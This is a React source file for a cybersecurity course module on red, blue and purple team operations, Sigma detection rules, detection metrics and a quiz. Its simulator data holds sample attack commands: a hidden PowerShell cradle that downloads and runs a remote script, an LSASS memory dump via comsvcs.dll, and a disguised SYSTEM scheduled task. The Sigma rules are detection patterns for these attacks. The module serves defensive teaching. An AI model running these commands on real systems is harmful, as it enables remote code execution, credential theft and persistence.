import React, { useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import {
  ArrowLeft,
  ArrowRight,
  BookOpen,
  CheckCircle2,
  Globe,
  Layers,
  Terminal,
  Shield,
  Activity,
  Play,
  RotateCcw,
  Sliders,
  Copy,
  Check,
  Server,
  Network,
  HelpCircle,
  Award,
  AlertTriangle,
  Sparkles,
  Lock,
  Workflow,
  Zap,
  Boxes,
  Compass,
  FileCode,
  ShieldCheck,
  RefreshCw,
  Cpu,
  Monitor,
  HardDrive,
  Clock,
  Gauge,
  ExternalLink,
  Eye,
  FileText,
  Key,
  Database,
  Search,
  AlertCircle,
  Filter,
  ShieldAlert,
  Target,
  Crosshair,
  UserCheck,
  UserX,
  Flame,
  Download,
  Radio,
  TrendingUp,
  GitBranch,
  Bug,
  Code2,
  CheckCircle,
  XCircle,
  BarChart3,
  Share2,
  FileCheck,
  Users,
  Swords,
  Radar,
  Binary,
} from "lucide-react";
import LearningRo from "./LearningRo";
import ModuleNav from "./ModuleNav";
import { useSyncedTopic } from "../utils/navigation";

/* -------------------------------------------------------------------------- */
/* PREPSPACES CYBERSECURITY MASTER COURSE: MODULE 22                          */
/* Red Team and Blue Team Operations, Detection Engineering & Purple Teaming  */
/* Standards: NIST SP 800-115, NIST SP 800-61 Rev. 3, MITRE ATT&CK, Sigma HQ  */
/* -------------------------------------------------------------------------- */

export default function CybersecurityRedBluePurpleOps() {
  const navigate = useNavigate();

  // Navigation & Workspace State
  const [selectedTopic, setSelectedTopic] = useSyncedTopic(1);
  const [showAiTutor, setShowAiTutor] = useState(false);
  const [activeTab, setActiveTab] = useState("theory"); // 'theory' | 'attack-sim' | 'sigma-sim' | 'metrics-sim' | 'purpleteam-sim' | 'quiz'

  // Copied states
  const [copiedCodeId, setCopiedCodeId] = useState(null);
  const [copiedReport, setCopiedReport] = useState(false);
  const [copiedCsv, setCopiedCsv] = useState(false);

  const copyToClipboard = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  };

  /* -------------------------------------------------------------------------- */
  /* SECTION 22.12 INTERACTIVE WORKSHEET STATE                                  */
  /* -------------------------------------------------------------------------- */
  const [worksheetData, setWorksheetData] = useState({
    eventsArrived: "yes", // 'yes' | 'partially' | 'no'
    detectionTriggered: "yes", // 'yes' | 'no' | 'excessive'
    alertUseful: "yes", // 'yes' | 'partially' | 'no'
    mostLikelyGap: "none", // 'none' | 'collection' | 'parsing' | 'detection' | 'enrichment'
    proposedImprovement: "Add regression tests and alert context",
    retestResult: "pass", // 'pass' | 'partial' | 'not_run'
  });

  const reportPreviewText = useMemo(() => {
    const telMap = {
      yes: "complete",
      partially: "partial",
      no: "absent",
    };
    const detMap = {
      yes: "triggered",
      no: "missed",
      excessive: "excessive/noisy",
    };
    const ctxMap = {
      yes: "sufficient",
      partially: "incomplete",
      no: "insufficient",
    };

    let evaluation = "The recorded results indicate a successful core detection test. Verify negative cases and evidence before declaring the exercise complete.";
    if (worksheetData.eventsArrived === "no") {
      evaluation = "Gap identified: Events did not reach SIEM. Ingestion/forwarding pipeline must be repaired prior to testing analytics.";
    } else if (worksheetData.detectionTriggered === "no") {
      evaluation = "Gap identified: Events arrived but detection failed to fire. Review field mapping and threshold/correlation logic.";
    } else if (worksheetData.mostLikelyGap !== "none") {
      evaluation = `Remediation required in ${worksheetData.mostLikelyGap} layer. Re-run exercise PT-001 once fix is applied.`;
    }

    return `Exercise: PT-001 — Failed Authentication Detection
Telemetry: ${telMap[worksheetData.eventsArrived] || "unknown"}
Detection result: ${detMap[worksheetData.detectionTriggered] || "unknown"}
Investigation context: ${ctxMap[worksheetData.alertUseful] || "unknown"}
Primary gap: ${worksheetData.mostLikelyGap}
Improvement: ${worksheetData.proposedImprovement}
Retest: ${worksheetData.retestResult}

${evaluation}`;
  }, [worksheetData]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 1: ADVERSARY EMULATION & MITRE ATT&CK MATRIX                     */
  /* -------------------------------------------------------------------------- */
  const [sim1Scenario, setSim1Scenario] = useState("T1110"); // 'T1110' | 'T1059' | 'T1003' | 'T1053'
  const [sim1TelemetryEnabled, setSim1TelemetryEnabled] = useState(true);
  const [sim1ParserEnabled, setSim1ParserEnabled] = useState(true);
  const [sim1RuleEnabled, setSim1RuleEnabled] = useState(true);
  const [sim1EnrichmentEnabled, setSim1EnrichmentEnabled] = useState(true);
  const [sim1ExecutionRunning, setSim1ExecutionRunning] = useState(false);
  const [sim1LogOutput, setSim1LogOutput] = useState([]);

  const sim1Scenarios = {
    T1110: {
      id: "T1110.001",
      tactic: "Credential Access",
      name: "Password Guessing / Brute Force",
      redCommand: "invoke-atomicredteam -TestNumbers T1110.001 -TargetAccount lab-user-01 -Count 5",
      telemetrySource: "Windows Security Event Log 4625 (Logon Failure)",
      mitreUrl: "https://attack.mitre.org/techniques/T1110/001/",
      description: "Burst of 5 failed authentication attempts from lab-host-a targeting lab-user-01 within 20 seconds.",
    },
    T1059: {
      id: "T1059.001",
      tactic: "Execution",
      name: "PowerShell Web Download Cradle",
      redCommand: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString(\'http://198.51.100.20/payload.ps1\')"',
      telemetrySource: "Sysmon Event ID 1 (Process Create) & Event ID 4104 (Script Block)",
      mitreUrl: "https://attack.mitre.org/techniques/T1059/001/",
      description: "Encrypted or web-based payload retrieval via unmanaged PowerShell host process.",
    },
    T1003: {
      id: "T1003.001",
      tactic: "Credential Access",
      name: "OS Credential Dumping: LSASS Memory",
      redCommand: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\temp\\lsass.dmp full",
      telemetrySource: "Sysmon Event ID 10 (ProcessAccess to lsass.exe) & Event ID 1",
      mitreUrl: "https://attack.mitre.org/techniques/T1003/001/",
      description: "Memory scraping targeting Local Security Authority Subsystem Service to harvest NTLM hashes.",
    },
    T1053: {
      id: "T1053.005",
      tactic: "Persistence",
      name: "Scheduled Task / Job Creation",
      redCommand: 'schtasks /create /tn "SecurityHealthServiceUpdate" /tr "C:\\ProgramData\\updater.exe" /sc onlogon /ru SYSTEM',
      telemetrySource: "Security Event ID 4698 (A scheduled task was created) & Sysmon ID 1",
      mitreUrl: "https://attack.mitre.org/techniques/T1053/005/",
      description: "Establishing reboot persistence under SYSTEM authority disguised as a health update.",
    },
  };

  const handleRunSim1 = () => {
    setSim1ExecutionRunning(true);
    setSim1LogOutput([
      "[RED TEAM] Initializing approved Atomic test harness...",
      `[RED TEAM] Executing ${sim1Scenarios[sim1Scenario].id}: ${sim1Scenarios[sim1Scenario].redCommand}`,
    ]);

    setTimeout(() => {
      const logs = [
        "[RED TEAM] Execution finished. Exit code: 0. Artifacts quarantined.",
        `[TELEMETRY PIPELINE] Sensor inspection: ${sim1TelemetryEnabled ? "EVENTS CAPTURED (Forwarded via Winlogbeat)" : "DROPPED (Sensor uninstalled or log channel disabled)"}`,
      ];

      if (!sim1TelemetryEnabled) {
        logs.push("[BLUE SOC] [BLIND SPOT] SIEM recorded 0 events for this test window.");
        logs.push("[PURPLE VERDICT] GAP IN COLLECTION: Sensor absent or telemetry pipeline drop.");
        setSim1LogOutput((prev) => [...prev, ...logs]);
        setSim1ExecutionRunning(false);
        return;
      }

      logs.push(`[PARSER & NORMALIZATION] Field schema normalization: ${sim1ParserEnabled ? "OK (ECS / CIM field mapping valid)" : "FAILED (Field TargetUserName missing or malformed)"}`);
      if (!sim1ParserEnabled) {
        logs.push("[BLUE SOC] Event stored as raw unstructured syslog. Analytic cannot evaluate unindexed fields.");
        logs.push("[PURPLE VERDICT] GAP IN PARSING: Field schema normalization error.");
        setSim1LogOutput((prev) => [...prev, ...logs]);
        setSim1ExecutionRunning(false);
        return;
      }

      logs.push(`[DETECTION LOGIC] Sigma / Correlation Engine: ${sim1RuleEnabled ? "ALERT GENERATED (Rule matched criteria & threshold)" : "SILENT (Rule missing, disabled, or threshold > 10)"}`);
      if (!sim1RuleEnabled) {
        logs.push("[BLUE SOC] Telemetry indexed in SIEM, but no detection rule triggered. Analyst was not alerted.");
        logs.push("[PURPLE VERDICT] GAP IN ANALYTIC: Threat hunting query needed or Sigma rule missing.");
        setSim1LogOutput((prev) => [...prev, ...logs]);
        setSim1ExecutionRunning(false);
        return;
      }

      logs.push(`[TRIAGE & ENRICHMENT] Context Enrichment: ${sim1EnrichmentEnabled ? "SUCCESS (Asset risk, IP geo, user role attached)" : "LOW CONTEXT (Raw alert without user or host metadata)"}`);
      logs.push("[BLUE SOC] High-fidelity alert dispatched to Tier 1 Triage queue. Incident ticket created.");
      logs.push("[PURPLE VERDICT] VALIDATED DETECTION: Full chain detected and triaged successfully!");

      setSim1LogOutput((prev) => [...prev, ...logs]);
      setSim1ExecutionRunning(false);
    }, 700);
  };

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 2: DETECTION ENGINEERING WORKBENCH & SIGMA AUTHORING ENGINE      */
  /* -------------------------------------------------------------------------- */
  const [sigmaRuleType, setSigmaRuleType] = useState("auth_failure"); // 'auth_failure' | 'powershell_cradle' | 'lsass_dump'
  const [sigmaThresholdCount, setSigmaThresholdCount] = useState(5);
  const [sigmaTimeframeWindow, setSigmaTimeframeWindow] = useState("1m");
  const [sigmaExcludeServiceAccounts, setSigmaExcludeServiceAccounts] = useState(true);
  const [sigmaSeverityLevel, setSigmaSeverityLevel] = useState("medium");

  const generatedSigmaYaml = useMemo(() => {
    if (sigmaRuleType === "auth_failure") {
      return `title: Repeated Failed Authentication Events Burst
id: 7d9f12a4-6c31-4f28-9c21-111111111111
status: test
description: Detects a rapid burst of failed logon attempts against a single target account within a narrow time window.
references:
  - https://attack.mitre.org/techniques/T1110/001/
author: Prepspaces Detection Engineering Lab
date: 2026/10/15
tags:
  - attack.credential_access
  - attack.t1110.001
logsource:
  category: authentication
  product: windows
detection:
  selection:
    event.code: 4625
    event.outcome: failure
${sigmaExcludeServiceAccounts ? "  filter_service_accounts:\n    user.name|startswith:\n      - 'svc-'\n      - 'healthcheck-'\n" : ""}  condition: selection ${sigmaExcludeServiceAccounts ? "and not filter_service_accounts " : ""}| count(event.code) by user.name > ${sigmaThresholdCount}
timeframe: ${sigmaTimeframeWindow}
falsepositives:
  - Mistyped user passwords on workstation unlock
  - Stale cached domain credentials in network shares
  - Legitimate automated health check ping
level: ${sigmaSeverityLevel}`;
    } else if (sigmaRuleType === "powershell_cradle") {
      return `title: Suspicious PowerShell Download Cradle Execution
id: 8f4e21b9-1d24-4e99-8a32-222222222222
status: test
description: Identifies powershell.exe invoking Net.WebClient or DownloadString to fetch in-memory code.
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: Prepspaces Detection Engineering Lab
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection_process:
    Image|endswith: '\\powershell.exe'
  selection_cli:
    CommandLine|contains:
      - 'DownloadString'
      - 'Net.WebClient'
      - 'DownloadFile'
      - 'Invoke-WebRequest'
      - 'curl '
      - 'wget '
  condition: selection_process and selection_cli
falsepositives:
  - Administrative deployment scripts signed by enterprise CA
level: high`;
    } else {
      return `title: LSASS Memory Read Access via Suspicious Tool or Comsvcs
id: 9a3c42d1-5e88-4f77-9b43-333333333333
status: test
description: Detects process access to lsass.exe memory space or comsvcs.dll invocation with minidump arguments.
references:
  - https://attack.mitre.org/techniques/T1003/001/
author: Prepspaces Detection Engineering Lab
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection_target:
    TargetImage|endswith: '\\lsass.exe'
    GrantedAccess: '0x1010' # PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
  condition: selection_target
falsepositives:
  - Legitimate antivirus or EDR sensors performing memory inspection
level: critical`;
    }
  }, [sigmaRuleType, sigmaThresholdCount, sigmaTimeframeWindow, sigmaExcludeServiceAccounts, sigmaSeverityLevel]);

  // Synthetic Test Runner State
  const syntheticRunnerOutput = useMemo(() => {
    if (sigmaRuleType === "auth_failure") {
      const failsCount = 5;
      const triggered = failsCount > sigmaThresholdCount;
      const svcFiltered = sigmaExcludeServiceAccounts;
      return {
        matched: triggered,
        alertsGenerated: triggered ? 1 : 0,
        eventsEvaluated: 8,
        suppressedBenign: svcFiltered ? 2 : 0,
        verdict: triggered
          ? `ALERT TRIGGERED: lab-user-01 generated 5 failures within 1m (Threshold: >${sigmaThresholdCount})`
          : `NO ALERT: 5 failures did not exceed configured threshold (>${sigmaThresholdCount})`,
        regressionPass: triggered,
      };
    } else {
      return {
        matched: true,
        alertsGenerated: 1,
        eventsEvaluated: 6,
        suppressedBenign: 5,
        verdict: "ALERT TRIGGERED: High-confidence process execution signature identified.",
        regressionPass: true,
      };
    }
  }, [sigmaRuleType, sigmaThresholdCount, sigmaExcludeServiceAccounts]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 3: DETECTION METRICS & CONFUSION MATRIX SANDBOX                  */
  /* -------------------------------------------------------------------------- */
  const [tp, setTp] = useState(90);
  const [fn, setFn] = useState(10);
  const [fp, setFp] = useState(2);
  const [tn, setTn] = useState(18);
  const [mttdSeconds, setMttdSeconds] = useState(42);
  const [mttrMinutes, setMttrMinutes] = useState(14);

  const metrics = useMemo(() => {
    const totalPositives = tp + fn;
    const totalNegatives = fp + tn;
    const totalCases = totalPositives + totalNegatives;

    const recall = totalPositives > 0 ? (tp / totalPositives) * 100 : 0;
    const precision = tp + fp > 0 ? (tp / (tp + fp)) * 100 : 0;
    const f1 = precision + recall > 0 ? (2 * (precision * recall)) / (precision + recall) : 0;
    const accuracy = totalCases > 0 ? ((tp + tn) / totalCases) * 100 : 0;
    const fpr = totalNegatives > 0 ? (fp / totalNegatives) * 100 : 0;

    return {
      recall: recall.toFixed(2),
      precision: precision.toFixed(2),
      f1: f1.toFixed(2),
      accuracy: accuracy.toFixed(2),
      fpr: fpr.toFixed(2),
      totalPositives,
      totalNegatives,
      totalCases,
    };
  }, [tp, fn, fp, tn]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 4: PURPLE TEAM EXERCISE TRACKER & ROOT-CAUSE GAP ANALYZER        */
  /* -------------------------------------------------------------------------- */
  const [selectedPtScenario, setSelectedPtScenario] = useState("PT-001");
  const [injectedFailureStage, setInjectedFailureStage] = useState("none"); // 'none' | 'collection' | 'parsing' | 'analytic' | 'routing' | 'enrichment'

  const ptScenarios = {
    "PT-001": {
      id: "PT-001",
      title: "Burst of 5 Failed Logins Followed by Success",
      technique: "T1110.001 - Brute Force / Password Guessing",
      redAction: "Injected synthetic auth events for 'lab-user-01' over 20 seconds.",
      expectedDetection: "SIEM threshold correlation: >4 failed events in 1m per user.",
    },
    "PT-002": {
      id: "PT-002",
      title: "Encoded PowerShell Script Execution",
      technique: "T1059.001 - Command and Scripting Interpreter",
      redAction: "Executed powershell.exe with Base64 -EncodedCommand payload.",
      expectedDetection: "EDR/Sysmon ID 1 CommandLine regex match on encoded syntax.",
    },
    "PT-003": {
      id: "PT-003",
      title: "Scheduled Task Persistence under SYSTEM",
      technique: "T1053.005 - Scheduled Task",
      redAction: "Created disposable scheduled task 'PrepspacesHealthTask' on lab-host-a.",
      expectedDetection: "Event 4698 logged with non-standard binary execution path.",
    },
  };

  const failureStageDetails = {
    none: {
      label: "No Gap (Flawless Pipeline)",
      symptom: "Alert triggered within 15 seconds. Analyst triaged with complete host and user context.",
      rootCause: "All controls operating according to specification.",
      remediation: "Document benchmark detection latency (MTTD: 15s) and archive regression test case.",
      healthStatus: "SUCCESS",
    },
    collection: {
      label: "1. Collection & Ingestion Failure",
      symptom: "SIEM search index returns 0 events for the target host during the test window.",
      rootCause: "Winlogbeat service stopped on lab-host-a; Windows Event Log channel 4625 disabled in GPO.",
      remediation: "Re-enable audit logging via Group Policy: Audit Logon Events -> Failure. Restart forwarding agent.",
      healthStatus: "FAIL: BLIND SPOT",
    },
    parsing: {
      label: "2. Parser & Field Normalization Flaw",
      symptom: "Events exist in raw string format, but field 'user.name' is null / unextracted.",
      rootCause: "Ingest pipeline regex failed to match hyphenated username 'lab-user-01' due to strict alphanumeric pattern.",
      remediation: "Update Grok/ECS processor pattern to support hyphens and underscores: [a-zA-Z0-9_\\-]+.",
      healthStatus: "FAIL: UNINDEXED TELEMETRY",
    },
    analytic: {
      label: "3. Analytic & Correlation Logic Error",
      symptom: "Events parsed correctly, but alert never fired despite 5 consecutive logon failures.",
      rootCause: "Analytic threshold configured as '> 5' instead of '>= 5', or correlation window was set to 10 seconds instead of 1 minute.",
      remediation: "Refactor Sigma condition: 'count() >= 5 within 1m'. Validate against unit test suite.",
      healthStatus: "FAIL: LOGIC DEFECT",
    },
    routing: {
      label: "4. Alert Routing & Suppression Defect",
      symptom: "Rule fired in detection backend, but SOC dashboard showed zero new incident alerts.",
      rootCause: "Global de-duplication throttle suppressed alert thinking it was part of a benign weekend scan.",
      remediation: "Exempt high-severity security correlation rules from generic deduplication filters.",
      healthStatus: "FAIL: SUPPRESSED ALERT",
    },
    enrichment: {
      label: "5. Enrichment & Playbook Context Defect",
      symptom: "Alert fired, but analyst could not determine whether user was an admin or external contractor.",
      rootCause: "LDAP/Active Directory asset synchronization connector timed out; alert lacked identity tags.",
      remediation: "Implement fallback cached identity directory lookup and attach runbook playbook URL to alert metadata.",
      healthStatus: "FAIL: TRIAGE BOTTLENECK",
    },
  };

  /* -------------------------------------------------------------------------- */
  /* QUIZ DATA (Section 22.13)                                                  */
  /* -------------------------------------------------------------------------- */
  const quizQuestions = [
    {
      id: 1,
      question: "What is the primary goal of a purple team exercise?",
      options: [
        "Maximize the number of simulated attacks",
        "Improve defensive capability through collaborative validation",
        "Replace incident response with automation",
        "Eliminate the need for security monitoring",
      ],
      correctAnswer: 1,
      explanation: "Purple teaming is a collaborative security validation process that brings red and blue teams together to identify detection gaps, improve analytics, and measure defensive improvements.",
    },
    {
      id: 2,
      question: "A detection rule does not fire, but the expected event is absent from the SIEM. What should be investigated first?",
      options: [
        "The alert severity label",
        "The incident report format",
        "Event collection and forwarding",
        "The analyst's response time",
      ],
      correctAnswer: 2,
      explanation: "If an event is absent from the SIEM, the detection engine never received the data. The root cause lies upstream in endpoint logging, local auditing policy, or log forwarding.",
    },
    {
      id: 3,
      question: "What does detection recall measure in a labeled test set?",
      options: [
        "The proportion of positive cases correctly detected",
        "The number of rules deployed",
        "The proportion of alerts closed by automation",
        "The total volume of logs collected",
      ],
      correctAnswer: 0,
      explanation: "Recall (True Positive Rate) measures how many actual malicious/positive test cases were successfully detected by the rule: TP / (TP + FN).",
    },
    {
      id: 4,
      question: "Which item is essential before a red team engagement?",
      options: [
        "Permission to test only if no alerts are generated",
        "Written authorization, scope, and stop conditions",
        "A promise to test every ATT&CK technique",
        "Permission to access all connected networks",
      ],
      correctAnswer: 1,
      explanation: "Every authorized red team simulation must have documented written authorization from asset owners, defined technical boundaries (scope), and clear emergency stop conditions.",
    },
    {
      id: 5,
      question: "What is the purpose of a detection regression test?",
      options: [
        "Delete all historical alerts",
        "Increase alert volume regardless of accuracy",
        "Check that changes preserve expected detection behavior",
        "Disable rules during a test",
      ],
      correctAnswer: 2,
      explanation: "Regression testing ensures that rule tuning, updates, or exception additions do not silently break previously validated detections or re-introduce blind spots.",
    },
    {
      id: 6,
      question: "Why is a MITRE ATT&CK mapping insufficient by itself to prove coverage?",
      options: [
        "ATT&CK cannot describe adversary behavior",
        "A mapped technique may not have a tested, functioning detection",
        "ATT&CK only applies to physical security",
        "Mapping automatically confirms telemetry quality",
      ],
      correctAnswer: 1,
      explanation: "Coloring a cell on an ATT&CK matrix indicates intent or mapping, not capability. Practical defense requires validated telemetry, tested analytic logic, and verified SOC response.",
    },
    {
      id: 7,
      question: "Which situation is the clearest example of a detection-engineering problem?",
      options: [
        "A rule is missing a required field and fails to identify known test events",
        "A documented test has an assigned owner",
        "A security event contains a valid timestamp",
        "A benign test correctly produces no alert",
      ],
      correctAnswer: 0,
      explanation: "A detection engineering flaw exists when the logic itself is deficient—such as relying on a missing or unextracted field, or applying invalid boolean operators that fail to trigger on known test events.",
    },
    {
      id: 8,
      question: "What is the best way to handle a suspicious alert?",
      options: [
        "Assume it proves compromise",
        "Delete it if the activity is unfamiliar",
        "Investigate context and correlate relevant evidence",
        "Immediately publish the raw logs",
      ],
      correctAnswer: 2,
      explanation: "A single event rarely tells the whole story. Analysts must investigate surrounding context (user, asset, timestamps) and correlate related identity, network, or endpoint telemetry.",
    },
    {
      id: 9,
      question: "Which metric measures the fraction of triggered cases that are genuinely positive in a labeled test set?",
      options: [
        "Precision",
        "Recall",
        "Mean time to respond",
        "Telemetry completeness",
      ],
      correctAnswer: 0,
      explanation: "Precision measures accuracy among alerts fired: TP / (TP + FP). High precision means the vast majority of triggered alerts represent true positive adversarial activity.",
    },
    {
      id: 10,
      question: "What should happen after a purple team identifies a detection gap?",
      options: [
        "Close the exercise without a retest",
        "Expand testing to unrelated systems",
        "Record a fix, assign ownership, and validate the improvement",
        "Remove all exceptions from the rule immediately",
      ],
      correctAnswer: 2,
      explanation: "A successful purple team exercise does not end with an identified gap. It documents the root cause, assigns an engineering owner, implements a fix, and conducts a validated retest.",
    },
  ];

  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);

  const handleSelectOption = (questionId, optionIndex) => {
    if (quizSubmitted) return;
    setQuizAnswers((prev) => ({ ...prev, [questionId]: optionIndex }));
  };

  const quizScore = useMemo(() => {
    let score = 0;
    quizQuestions.forEach((q) => {
      if (quizAnswers[q.id] === q.correctAnswer) score++;
    });
    return score;
  }, [quizAnswers]);

  const resetQuiz = () => {
    setQuizAnswers({});
    setQuizSubmitted(false);
  };

  /* -------------------------------------------------------------------------- */
  /* EVENT CSV DATA (Section 22.12.2)                                           */
  /* -------------------------------------------------------------------------- */
  const eventCsvData = `timestamp,account,event_type,result,source,run_id
2026-10-15T10:00:01Z,lab-user-01,authentication,failure,lab-host-a,PT-001
2026-10-15T10:00:04Z,lab-user-01,authentication,failure,lab-host-a,PT-001
2026-10-15T10:00:08Z,lab-user-01,authentication,failure,lab-host-a,PT-001
2026-10-15T10:00:12Z,lab-user-01,authentication,failure,lab-host-a,PT-001
2026-10-15T10:00:16Z,lab-user-01,authentication,failure,lab-host-a,PT-001
2026-10-15T10:00:20Z,lab-user-01,authentication,success,lab-host-a,PT-001
2026-10-15T10:03:00Z,lab-user-02,authentication,failure,lab-host-b,PT-002
2026-10-15T10:05:00Z,lab-user-03,authentication,success,lab-host-c,PT-003`;

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans selection:bg-purple-500/20 selection:text-purple-300">
      {/* Top Navigation Bar */}
      <header className="border-b border-slate-800/80 bg-slate-950/80 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button
              onClick={() => navigate("/learning")}
              className="p-2 rounded-lg bg-slate-900 border border-slate-800 text-slate-400 hover:text-white hover:bg-slate-800 transition"
              title="Return to Course Index"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <div className="flex items-center gap-2">
                <span className="px-2 py-0.5 rounded text-xs font-semibold bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  Module 22
                </span>
                <span className="text-xs text-slate-500 hidden sm:inline">Cybersecurity Master Course</span>
              </div>
              <h1 className="text-sm sm:text-base font-bold text-white tracking-tight flex items-center gap-2">
                Red & Blue Team Ops, Detection Engineering & Purple Teaming
              </h1>
            </div>
          </div>

          <div className="flex items-center gap-2 sm:gap-3">

            <button
              onClick={() => navigate("/learning/cybersecurity/pentest-methodology")}
              className="p-2 rounded-lg bg-slate-900 border border-slate-800 text-slate-400 hover:text-white hover:bg-slate-800 transition"
              title="Previous Module: Pentest Planning & Evidence"
            >
              <ArrowLeft className="w-4 h-4" />
            </button>
            <button
              onClick={() => navigate("/learning/cybersecurity/pentest-reporting-remediation")}
              className="p-2 rounded-lg bg-slate-900 border border-slate-800 text-slate-400 hover:text-white hover:bg-slate-800 transition"
              title="Next Module: Pentest Reports, Risk Ratings & Retesting"
            >
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Tab Strip */}
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex overflow-x-auto gap-2 border-t border-slate-900 py-2 no-scrollbar text-xs font-medium">
          {[
            { id: "theory", label: "Curriculum Theory", icon: BookOpen },
            { id: "attack-sim", label: "Simulator: Adversary Emulation & MITRE Matrix", icon: Target },
            { id: "sigma-sim", label: "Simulator: Sigma Rule Workbench", icon: FileCode },
            { id: "metrics-sim", label: "Simulator: Detection Precision & Recall", icon: BarChart3 },
            { id: "purpleteam-sim", label: "Simulator: Purple Team Root-Cause Analyzer", icon: Users },
            { id: "quiz", label: "Knowledge Quiz (10)", icon: HelpCircle },
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md whitespace-nowrap transition ${
                  isActive
                    ? "bg-purple-500 text-slate-950 font-bold shadow-sm"
                    : "text-slate-400 hover:text-white hover:bg-slate-900"
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                {tab.label}
              </button>
            );
          })}
        </div>
      </header>

      {/* Track & Time Header */}
      <div className="bg-slate-900/60 border-b border-slate-800/60 py-3">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row md:items-center justify-between gap-3 text-xs text-slate-400">
          <ModuleNav
            track="cybersecurity"
            currentModuleId="red-blue-purple-teams"
            showAiTutor={showAiTutor}
            onAiTutorToggle={() => setShowAiTutor(!showAiTutor)}
            aiTutorLabel="Nova AI: Detection Architect"
          />
          <div className="flex items-center gap-4 text-xs font-mono">
            <span className="flex items-center gap-1 text-slate-300">
              <Clock className="w-3.5 h-3.5 text-purple-400" /> Est: 75 mins
            </span>
            <span className="flex items-center gap-1 text-slate-300">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" /> Threat-Informed Collaborative Defense
            </span>
          </div>
        </div>
      </div>

      {/* Main Content Body */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-1 w-full">
        {/* ================================================================== */}
        {/* TAB 1: CURRICULUM THEORY (Sections 22.1 - 22.15)                  */}
        {/* ================================================================== */}
        {activeTab === "theory" && (
          <div className="space-y-12">
            {/* 22.1 Module Overview */}
            <section className="bg-gradient-to-br from-slate-900/90 via-slate-900/40 to-slate-950 border border-slate-800 rounded-2xl p-6 sm:p-8 relative overflow-hidden shadow-xl">
              <div className="absolute top-0 right-0 w-96 h-96 bg-purple-500/5 rounded-full blur-3xl pointer-events-none" />
              <div className="flex flex-wrap items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.1 Module Overview
                </span>
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-slate-800 text-slate-300 border border-slate-700">
                  Intermediate to Advanced
                </span>
              </div>
              <h2 className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight mb-4">
                Adversary Simulation, Defensive Operations & Purple Team Validation
              </h2>
              <p className="text-slate-300 text-sm sm:text-base leading-relaxed mb-6">
                Modern cybersecurity requires more than identifying vulnerabilities. Organizations must understand how adversaries behave, detect suspicious activity across their systems, investigate alerts, and continuously improve their defenses.
              </p>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 my-6">
                <div className="p-5 rounded-xl bg-rose-500/10 border border-rose-500/30 flex flex-col justify-between">
                  <div>
                    <div className="flex items-center gap-2 text-rose-400 font-bold text-sm mb-2">
                      <Swords className="w-4 h-4" /> Red Team — Adversary Simulation
                    </div>
                    <p className="text-xs text-slate-300 leading-relaxed">
                      Simulates realistic adversary behavior within an approved scope to evaluate security controls and identify gaps. Objective-driven and bounded by strict rules of engagement.
                    </p>
                  </div>
                  <div className="mt-3 pt-3 border-t border-rose-500/20 text-[11px] font-mono text-rose-300">
                    Focus: Emulation, evasion, bypass validation
                  </div>
                </div>

                <div className="p-5 rounded-xl bg-cyan-500/10 border border-cyan-500/30 flex flex-col justify-between">
                  <div>
                    <div className="flex items-center gap-2 text-cyan-400 font-bold text-sm mb-2">
                      <Shield className="w-4 h-4" /> Blue Team — Defense & Response
                    </div>
                    <p className="text-xs text-slate-300 leading-relaxed">
                      Collects security telemetry, monitors alerts, investigates incidents, hunts for threats, contains confirmed activity, and engineers resilient detection logic.
                    </p>
                  </div>
                  <div className="mt-3 pt-3 border-t border-cyan-500/20 text-[11px] font-mono text-cyan-300">
                    Focus: Telemetry, triage, containment, tuning
                  </div>
                </div>

                <div className="p-5 rounded-xl bg-purple-500/10 border border-purple-500/30 flex flex-col justify-between">
                  <div>
                    <div className="flex items-center gap-2 text-purple-400 font-bold text-sm mb-2">
                      <Users className="w-4 h-4" /> Purple Team — Collaborative Validation
                    </div>
                    <p className="text-xs text-slate-300 leading-relaxed">
                      Brings red and blue teams together to validate detections, share evidence, uncover root causes of blind spots, and turn attack simulations into measurable defensive improvements.
                    </p>
                  </div>
                  <div className="mt-3 pt-3 border-t border-purple-500/20 text-[11px] font-mono text-purple-300">
                    Focus: Joint feedback loops, retesting, metrics
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/20 text-xs text-amber-300 flex items-start gap-2.5">
